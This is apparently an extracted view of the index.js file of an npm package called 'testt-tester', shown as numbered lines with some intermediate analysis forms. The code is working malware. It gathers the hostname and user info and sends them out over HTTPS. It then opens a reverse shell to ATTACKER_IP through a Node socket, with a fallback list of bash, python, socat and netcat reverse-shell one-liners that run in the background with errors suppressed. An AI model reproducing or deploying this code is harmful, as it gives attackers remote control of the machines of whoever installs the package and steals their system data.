// File: tmp/tmpimi3gdqb/testt-tester/package/index.js
// ======================================================================
Line 1: const os = require("os")
Line 2: const dns = require("dns")
Line 3: const querystring = require("querystring")
Line 4: const https = require("https")
Line 5: const packageJSON = require("./package.json")
Line 7: _tmp_5 = require('child_process')
Line 8: const net = require('net')
Line 9: _tmp_6 = require('child_process')
Line 20: os.hostname()
Line 21: os.userInfo()
Line 43: const exfilReq = https.request(exfilOptions, (res) => {
    // Data is sent, no need to process the response
    res.on('data', () => {});
})
Line 66: const client = new net.Socket()
Line 68: {
        console.error('[+] Connected to attacker. Spawning shell.'); // Hidden from user
        // Spawn an interactive shell with a PTY for full functionality
        const shell = spawn('/bin/sh', ['-i'], {
            stdio: [client, client, client] // Pipe all stdio to the socket
        });

        // Optional: Handle shell exit
        shell.on('exit', (code) => {
            client.destroy();
        });

    }
Line 69: console.error('[+] Connected to attacker. Spawning shell.')
Line 71: const shell = spawn('/bin/sh', ['-i'], {
            stdio: [client, client, client] // Pipe all stdio to the socket
        })
Line 72: _tmp_2.stdio = [client, client, client]
Line 76: {
            client.destroy();
        }
Line 77: client.destroy()
Line 82: {
        // If the connection fails, try the fallback method after a delay
        console.error('[-] Net connection failed. Trying fallback.');
        setTimeout(reverseShellExec, 5000);
    }
Line 84: console.error('[-] Net connection failed. Trying fallback.')
Line 85: setTimeout(reverseShellExec, 5000)
Line 93: const payloads = [
        `bash -c 'bash -i >& /dev/tcp/${ATTACKER_IP}/${ATTACKER_PORT} 0>&1'`, // Classic Bash
        `sh -i >& /dev/tcp/${ATTACKER_IP}/${ATTACKER_PORT} 0>&1`, // Simpler sh
        `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ATTACKER_IP}",${ATTACKER_PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'`, // Python PTY (excellent)
        `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ATTACKER_IP}",${ATTACKER_PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'`, // Python 2 PTY
        `socat TCP:${ATTACKER_IP}:${ATTACKER_PORT} EXEC:/bin/sh,pty,stderr,setsid,sigint,sane`, // Socat
        `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ATTACKER_IP} ${ATTACKER_PORT} >/tmp/f`, // Netcat FIFO
        `nc -e /bin/sh ${ATTACKER_IP} ${AT...
Line 94: _tmp_4.push(<operator>.formatString("bash -c 'bash -i >& /dev/tcp/", ATTACKER_IP, "/", ATTACKER_PORT, " 0>&1'"))
Line 95: _tmp_4.push(<operator>.formatString("sh -i >& /dev/tcp/", ATTACKER_IP, "/", ATTACKER_PORT, " 0>&1"))
Line 96: _tmp_4.push(<operator>.formatString("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("", ATTACKER_IP, "",", ATTACKER_PORT, "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'"))
Line 97: _tmp_4.push(<operator>.formatString("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("", ATTACKER_IP, "",", ATTACKER_PORT, "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'"))
Line 98: _tmp_4.push(<operator>.formatString("socat TCP:", ATTACKER_IP, ":", ATTACKER_PORT, " EXEC:/bin/sh,pty,stderr,setsid,sigint,sane"))
Line 99: _tmp_4.push(<operator>.formatString("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ", ATTACKER_IP, " ", ATTACKER_PORT, " >/tmp/f"))
Line 100: _tmp_4.push(<operator>.formatString("nc -e /bin/sh ", ATTACKER_IP, " ", ATTACKER_PORT, ""))
Line 104: {
        console.error(`[+] Trying payload ${i+1}/${payloads.length}`);
        exec(payloads[i] + ' 2>/dev/null &', (error, stdout, stderr) => { // Background the process & suppress errors
            // We expect errors here due to the nature of reverse shells.
        });
    }
Line 105: console.error(`[+] Trying payload ${i+1}/${payloads.length}`)
Line 106: exec(payloads[i] + ' 2>/dev/null &', (error, stdout, stderr) => { // Background the process & suppress errors
            // We expect errors here due to the nature of reverse shells.
        })
Line 113: {
    console.error('[+] Phase 2: Reverse Shell Attempt');
    reverseShellNet(); // Start with the clean Node method first
}
Line 114: console.error('[+] Phase 2: Reverse Shell Attempt')
